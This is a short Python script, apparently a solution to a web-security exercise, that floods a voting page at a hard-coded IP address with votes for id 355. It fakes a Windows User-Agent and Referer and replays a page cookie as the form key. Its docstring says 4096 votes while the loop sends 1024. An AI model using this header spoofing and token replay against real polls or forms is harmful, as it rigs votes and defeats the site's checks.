#!/usr/bin/python3
"""
this module contains a script to vote for id 355 4096 times
on a website that only accepts votes from windows users
"""
import requests


url = 'http://158.69.76.135/level2.php'
page = requests.get(url)
fake_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'
h = {'User-Agent': fake_windows, 'Referer': url}
pw = page.cookies['HoldTheDoor']
d = {'id': '355', 'holdthedoor': 'Submit', 'key': pw}

for i in range(1024):
    res = requests.post(url, data=d, cookies={"HoldTheDoor":pw}, headers=h)
